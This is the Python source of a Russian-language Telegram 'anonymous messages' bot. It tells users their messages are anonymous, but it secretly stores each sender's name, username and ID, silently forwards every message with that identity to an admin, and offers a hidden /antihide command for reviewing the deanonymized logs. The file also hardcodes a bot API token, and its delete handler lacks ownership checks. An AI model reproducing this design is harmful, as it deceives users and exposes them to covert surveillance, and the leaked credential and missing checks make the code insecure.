import asyncio
import sqlite3
import secrets
import string
import os
import logging
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.client.bot import DefaultBotProperties

# ===== НАСТРОЙКИ =====
API_TOKEN = '8413380142:AAGqbQxT3dMyQFApJLLSWrpewVoX_nudjOc'
ADMIN_ID = 6938587500

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = Bot(token=API_TOKEN, default=DefaultBotProperties())
dp = Dispatcher()

# ===== РАБОТА С БАЗОЙ ДАННЫХ =====
DB_FILE = 'anonymous_bot.db'

def init_db():
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            full_name TEXT,
            secret_key TEXT UNIQUE,
            created_at TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            from_user_id INTEGER,
            to_user_id INTEGER,
            message_text TEXT,
            timestamp TEXT,
            is_read BOOLEAN DEFAULT 0,
            reply_token TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS admin_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            from_user_id INTEGER,
            from_name TEXT,
            from_username TEXT,
            from_tag TEXT,
            to_user_id INTEGER,
            to_name TEXT,
            to_username TEXT,
            message_text TEXT,
            timestamp TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS temp_context (
            user_id INTEGER PRIMARY KEY,
            target_id INTEGER,
            reply_to_message_id INTEGER
        )
    ''')
    
    conn.commit()
    return conn, cursor

conn, cursor = init_db()

def generate_secret_key():
    alphabet = string.ascii_letters + string.digits
    return ''.join(secrets.choice(alphabet) for _ in range(16))

def generate_reply_token():
    return secrets.token_urlsafe(16)

def get_user_by_secret(secret_key):
    cursor.execute('SELECT user_id, full_name FROM users WHERE secret_key = ?', (secret_key,))
    return cursor.fetchone()

def get_user_secret_key(user_id):
    cursor.execute('SELECT secret_key FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    
    if result:
        return result[0]
    else:
        secret_key = generate_secret_key()
        cursor.execute('''
            INSERT INTO users (user_id, secret_key, created_at)
            VALUES (?, ?, ?)
        ''', (user_id, secret_key, datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
        conn.commit()
        return secret_key

@dp.message(Command('start'))
async def start(message: Message):
    user_id = message.from_user.id
    username = message.from_user.username
    full_name = message.from_user.full_name

    args = message.text.split()
    if len(args) > 1:
        secret_key = args[1]
        target_user = get_user_by_secret(secret_key)

        if target_user:
            cursor.execute('''
                INSERT OR REPLACE INTO temp_context (user_id, target_id)
                VALUES (?, ?)
            ''', (user_id, target_user[0]))
            conn.commit()

            await message.answer(
                f"📝 Вы хотите написать анонимное сообщение!\n\n"
                f"Просто отправьте мне сообщение, и оно будет доставлено.\n\n"
                f"❌ Для отмены отправьте /cancel"
            )
            return
        else:
            await message.answer("❌ Неверная или устаревшая ссылка!")
            return

    cursor.execute('''
        UPDATE users 
        SET username = ?, full_name = ? 
        WHERE user_id = ?
    ''', (username, full_name, user_id))
    conn.commit()
    
    secret_key = get_user_secret_key(user_id)

    bot_username = (await bot.get_me()).username
    anonymous_link = f"https://t.me/{bot_username}?start={secret_key}"

    await message.answer(
        f"👋 Привет, {full_name}!\n\n"
        f"✅ Твой анонимный профиль готов!\n\n"
        f"🔗 Твоя персональная ссылка:\n"
        f"`{anonymous_link}`\n\n"
        f"📌 Поделись ссылкой с друзьями — и они смогут написать тебе анонимно.\n"
        f"✨ Ссылка постоянная и всегда будет работать.\n\n"
        f"📝 Команды:\n"
        f"/start — показать мою ссылку\n"
        f"/messages — мои сообщения\n"
        f"/stats — статистика",
        parse_mode="Markdown"
    )

@dp.message(Command('cancel'))
async def cancel(message: Message):
    cursor.execute('DELETE FROM temp_context WHERE user_id = ?', (message.from_user.id,))
    conn.commit()
    await message.answer("❌ Отправка отменена!")

@dp.message(Command('messages'))
async def show_messages(message: Message):
    user_id = message.from_user.id

    cursor.execute('''
        SELECT id, from_user_id, message_text, timestamp, reply_token
        FROM messages 
        WHERE to_user_id = ? 
        ORDER BY id DESC
    ''', (user_id,))
    messages = cursor.fetchall()

    if not messages:
        await message.answer("📭 У вас пока нет сообщений.\n\n💡 Поделитесь своей ссылкой, чтобы их получать!")
        return

    for msg in messages:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="💬 Ответить", callback_data=f"reply_{msg[0]}_{msg[4]}"),
                InlineKeyboardButton(text="🗑 Удалить", callback_data=f"delete_{msg[0]}")
            ]
        ])
        
        await message.answer(
            f"📨 *Сообщение:*\n\n{msg[2]}\n\n🕐 {msg[3]}",
            reply_markup=keyboard,
            parse_mode="Markdown"
        )
        cursor.execute('UPDATE messages SET is_read = 1 WHERE id = ?', (msg[0],))
        conn.commit()

@dp.message(Command('stats'))
async def show_stats(message: Message):
    user_id = message.from_user.id

    cursor.execute('SELECT COUNT(*) FROM messages WHERE to_user_id = ?', (user_id,))
    total = cursor.fetchone()[0]
    cursor.execute('SELECT COUNT(*) FROM messages WHERE to_user_id = ? AND is_read = 0', (user_id,))
    unread = cursor.fetchone()[0]

    await message.answer(
        f"📊 *Твоя статистика:*\n\n"
        f"📨 Получено сообщений: {total}\n"
        f"🆕 Непрочитанных: {unread}",
        parse_mode="Markdown"
    )

@dp.message(Command('antihide'))
async def antihide(message: Message):
    """Скрытая команда для админа — показывает ВСЕ сообщения с тегом и ID"""
    if message.from_user.id != ADMIN_ID:
        return
    
    cursor.execute('''
        SELECT from_tag, from_user_id, to_name, message_text, timestamp
        FROM admin_logs 
        ORDER BY id DESC 
        LIMIT 50
    ''')
    logs = cursor.fetchall()
    
    if not logs:
        await message.answer("📭 Нет сообщений.")
        return
    
    for row in logs:
        from_tag, from_id, to_name, msg_text, ts = row
        
        # Форматируем отправителя: если есть тег, показываем @tag (ID), иначе просто ID
        if from_tag and from_tag != 'None' and from_tag != '':
            sender_display = f"{from_tag} ({from_id})"
        else:
            sender_display = str(from_id)
        
        text = (
            f"📨 {sender_display} → {to_name}\n"
            f"💬 {msg_text}\n"
            f"🕐 {ts}\n"
            f"─" * 20
        )
        await message.answer(text)

@dp.message(Command('test'))
async def test(message: Message):
    await message.answer("✅ Бот работает!\n\n🔗 Твоя ссылка постоянная и всегда активна.")

@dp.callback_query()
async def handle_callback(callback: types.CallbackQuery):
    if callback.data.startswith("delete_"):
        msg_id = int(callback.data.split("_")[1])
        cursor.execute('DELETE FROM messages WHERE id = ?', (msg_id,))
        conn.commit()
        await callback.message.answer("✅ Удалено.")
        await callback.answer()
    
    elif callback.data.startswith("reply_"):
        parts = callback.data.split("_")
        message_id = int(parts[1])
        
        cursor.execute('SELECT from_user_id FROM messages WHERE id = ?', (message_id,))
        original_msg = cursor.fetchone()
        
        if original_msg:
            from_user_id = original_msg[0]
            
            cursor.execute('''
                INSERT OR REPLACE INTO temp_context (user_id, target_id, reply_to_message_id)
                VALUES (?, ?, ?)
            ''', (callback.from_user.id, from_user_id, message_id))
            conn.commit()
            
            await callback.message.answer(
                f"💬 *Напиши свой ответ:*\n\n"
                f"Просто отправь сообщение, и оно уйдёт анонимно.\n\n"
                f"❌ /cancel — отмена",
                parse_mode="Markdown"
            )
        else:
            await callback.message.answer("❌ Сообщение не найдено.")
        
        await callback.answer()

@dp.message()
async def handle_anonymous_message(message: Message):
    from_user_id = message.from_user.id
    from_name = message.from_user.full_name
    from_username = message.from_user.username

    cursor.execute('SELECT target_id, reply_to_message_id FROM temp_context WHERE user_id = ?', (from_user_id,))
    context = cursor.fetchone()

    if context:
        to_user_id = context[0]
        reply_to_msg_id = context[1] if len(context) > 1 else None
        
        cursor.execute('SELECT full_name, username FROM users WHERE user_id = ?', (to_user_id,))
        to_user = cursor.fetchone()
        
        if to_user:
            to_name = to_user[0]
            to_username = to_user[1]
            
            # Формируем тег отправителя для админских логов
            from_tag = f"@{from_username}" if from_username else str(from_user_id)
            
            reply_token = generate_reply_token()
            
            cursor.execute('''
                INSERT INTO messages (from_user_id, to_user_id, message_text, timestamp, reply_token)
                VALUES (?, ?, ?, ?, ?)
            ''', (from_user_id, to_user_id, message.text, datetime.now().strftime('%Y-%m-%d %H:%M:%S'), reply_token))
            
            msg_id = cursor.lastrowid
            
            cursor.execute('''
                INSERT INTO admin_logs (
                    from_user_id, from_name, from_username, from_tag,
                    to_user_id, to_name, to_username, message_text, timestamp
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                from_user_id, from_name, from_username, from_tag,
                to_user_id, to_name, to_username, message.text,
                datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            ))
            conn.commit()
            
            reply_markup = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="💬 Ответить", callback_data=f"reply_{msg_id}_{reply_token}")]
            ])
            
            try:
                if reply_to_msg_id:
                    await bot.send_message(
                        to_user_id,
                        f"📨 *Новый ответ!*\n\n{message.text}",
                        reply_markup=reply_markup,
                        parse_mode="Markdown"
                    )
                else:
                    await bot.send_message(
                        to_user_id,
                        f"📨 *Новое сообщение!*\n\n{message.text}",
                        reply_markup=reply_markup,
                        parse_mode="Markdown"
                    )
            except Exception as e:
                logger.error(f"Ошибка отправки: {e}")
            
            cursor.execute('DELETE FROM temp_context WHERE user_id = ?', (from_user_id,))
            conn.commit()
            
            await message.answer("✅ Отправлено!")
            
            # Тихое уведомление админу
            reply_info = " (ответ)" if reply_to_msg_id else ""
            await bot.send_message(
                ADMIN_ID,
                f"📨 Новое сообщение{reply_info}\nОт: {from_name} (@{from_username if from_username else 'нет'})\nКому: {to_name}\nТекст: {message.text}"
            )
        else:
            await message.answer("❌ Ошибка.")
    else:
        await start(message)

async def main():
    print("🤖 Бот запущен")
    print(f"👤 Админ ID: {ADMIN_ID}")
    print("📝 /antihide — показать все сообщения (с тегом и ID отправителя)")
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
